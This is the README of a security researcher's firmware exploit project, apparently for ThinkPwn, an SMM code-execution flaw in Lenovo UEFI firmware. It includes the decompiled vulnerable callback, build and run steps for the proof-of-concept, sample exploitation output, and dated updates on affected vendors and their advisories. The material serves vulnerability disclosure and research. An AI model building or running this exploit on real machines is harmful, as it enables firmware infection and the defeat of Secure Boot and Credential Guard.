
  Lenovo ThinkPad System Management Mode arbitrary code execution exploit

***************************************************************************

For more information about this project please read the following article:

http://blog.cr4.sh/2016/06/exploring-and-exploiting-lenovo.html


This code exploits 0day privileges escalation vulnerability (or backdoor?) in SystemSmmRuntimeRt UEFI driver (GUID is 7C79AC8C-5E6C-4E3D-BA6F-C260EE7C172E) of Lenovo firmware. Vulnerability is present in all of the ThinkPad series laptops, the oldest one that I have checked is X220 and the newest one is T450s (with latest firmware versions available at this moment). Running of arbitrary System Management Mode code allows attacker to disable flash write protection and infect platform firmware, disable Secure Boot, bypass Virtual Secure Mode (Credential Guard, etc.) on Windows 10 Enterprise and do others evil things.

##########################################

UPDATE FROM 30.06.2016:

Vulnerable code of SystemSmmRuntimeRt UEFI driver was copy-pasted by Lenovo from Intel reference code for 8-series chipsets. This exact code is not available in public but open source firmware of some Intel boards is also sharing it. For example, here you can see SmmRuntimeManagementCallback() function from Intel Quark BSP -- it's exactly the same vulnerable code.

https://kernel.googlesource.com/pub/scm/linux/kernel/git/jejb/Quark_EDKII/+/master/QuarkSocPkg/QuarkNorthCluster/Smm/Dxe/SmmRuntime/SmmRuntime.c#639

EDK2 source from public repository never had this vulnerability -- it's version of QuarkSocPkg was heavily modified in comparison with vulnerable one:

https://github.com/tianocore/edk2/commits/master/QuarkSocPkg

It means that original vulnerability was fixed by Intel in the middle of 2014. Unfortunately, there was no any public advisories, so, it's still not clear that Intel or Lenovo actually knew about it. There's a high possibility that old Intel code with this vulnerability currently present in firmware of other OEM/IBV vendors.

##########################################

UPDATE FROM 01.07.2016:

Lenovo released advisory for this vulnerability, they claims that vulnerable code written by Intel was received from 3-rd party IBV (Independent BIOS Vendor):

https://support.lenovo.com/my/en/solutions/LEN-8324

Now we can say for sure that products from other OEM's also has this vulnerability.

##########################################

UPDATE FROM 02.07.2016:

One of my followers confirmed that vulnerable code is present in his HP Pavilion laptop:

https://twitter.com/al3xtjames/status/749063556486791168

##########################################

UPDATE FROM 05.07.2016:

Alex James found vulnerable code on motherboards from GIGABYTE (Z68-UD3H, Z77X-UD5H, Z87MX-D3H, Z97-D3H and many others):

https://twitter.com/al3xtjames/status/750163415159582720
https://twitter.com/al3xtjames/status/750183816266940417

The interesting fact -- vulnerable UEFI driver from their firmwares has different GUID value than HP and Lenovo: A56897A1-A77F-4600-84DB-22B0A801FA9A

##########################################

UPDATE FROM 06.07.2016:

Japanese researcher known as 173210 found vulnerable code in firmware of Fujitsu LIFEBOOK A574/H, other Fujitsu computers probably affected as well:

https://twitter.com/173210/status/750565904111562752
https://twitter.com/173210/status/750569389741731840

##########################################

UPDATE FROM 07.07.2016:

Kasey Smith figured that Dell Latitude E6430 is also vulnerable, it means that other computers from Dell might be affected as well:

https://twitter.com/Ziginox/status/750778513012043776

##########################################

UPDATE FROM 08.07.2016:

Lenovo updated their advisory with product models information, there's a quite lot of vulnerable machines from IdeaPad and ThinkPad lines:

https://support.lenovo.com/my/en/solutions/LEN-8324

Also, it seems that vulnerability is not present in Skylake based Lenovo computers.

##########################################

UPDATE FROM 08.08.2016:

It seems that server motherboards from Intel are also vulnerable, Intel released their own advisory for ThinkPwn (aka SmmRuntime) vulnerability: 

https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00056&languageid=en-fr

Fixes will be released at 19-th of September. 

##########################################

UPDATE FROM 09.08.2016:

HP released ThinkPwn advisory with the list of vulnerable computer models:

http://h20564.www2.hp.com/hpsc/doc/public/display?docId=emr_na-c05230715

Patches are not available yet.

##########################################


Vulnerable SMM callback code:

    EFI_STATUS __fastcall sub_AD3AFA54(
        EFI_HANDLE SmmImageHandle, VOID *CommunicationBuffer, UINTN *SourceSize)
    {
        VOID *v3; // rax@1
        VOID *v4; // rbx@1

        // get some structure pointer from EFI_SMM_COMMUNICATE_HEADER.Data
        v3 = *(VOID **)(CommunicationBuffer + 0x20);
        v4 = CommunicationBuffer;
        if (v3)
        {
            /*
              Vulnerability is here:
              this code calls some function by address from obtained v3 structure field.
            */
            *(v3 + 0x8)(*(VOID **)v3, &dword_AD002290, CommunicationBuffer + 0x18);

            // set zero value to indicate successful operation
            *(VOID **)(v4 + 0x20) = 0;
        }
        
        return 0;
    }


Proof of concept exploit for this vulnerability is designed as UEFI application that runs from UEFI shell. It's also possible to exploit it from running operating system but you have to implement your own EFI_BASE_PROTOCOL.Communicate() function.

This exact PoC was designed only for Lenovo computers and it's a pure luck that it works anywhere else. If it will fail to exploit the vulnerability on any other vendor machine it doesn't mean that machine is not vulnerable, probably it just not supported by exploit.

To build exploit from the source code on Windows with Visual Studio compiler you have to perform the following steps:

  1. Copy ThinkPwn project directory into the EDK2 source code directory.

  2. Run Visual Studio 2008 Command Prompt and cd to EDK2 directory.

  3. Execute Edk2Setup.bat --pull to configure build environment and download required binaries.

  4. Edit AppPkg/AppPkg.dsc file and add path of ThinkPwn/ThinkPwn.dsc to the end of the [Components] section.

  5. cd to the ThinkPwn project directory and run build command.

  6. After compilation resulting PE image file will be created at Build/AppPkg/DEBUG_VS2008x86/X64/ThinkPwn/ThinkPwn/OUTPUT/ThinkPwn.efi


To test exploit on your own hardware:

  1. Prepare FAT32 formatted USB flash drive with ThinkPwn.efi and UEFI Shell (https://github.com/tianocore/tianocore.github.io/wiki/Efi-shell) binaries.

  2. Boot into the UEFI shell and execute ThinkPwn.efi application.


Usage example:

FS1:\> ThinkPwn.efi

SMM access protocol is at 0xaa5f8b00
Available SMRAM regions:
 * 0xad000000:0xad3fffff
SMM base protocol is at 0xaa989340
Buffer for SMM communicate call is allocated at 0xacbfb018
Obtaining FvFile(7C79AC8C-5E6C-4E3D-BA6F-C260EE7C172E) image handles...
 * Handle = 0xa4aee798
   Communicate() returned status 0x0000000e, data size is 0x1000
 * Handle = 0xa4aee298
   Communicate() returned status 0x00000000, data size is 0x1000
SmmHandler() was executed, exploitation success!


This repository is also contains a Python program that allows to scan firmware image from any computer vendor/model for UEFI SMM driver that has ThinkPwn vulnerability. For more information check it's source code:

https://github.com/Cr4sh/ThinkPwn/blob/master/scan_thinkpwn.py


Written by:
Dmytro Oleksiuk (aka Cr4sh)

cr4sh0@gmail.com
http://blog.cr4.sh
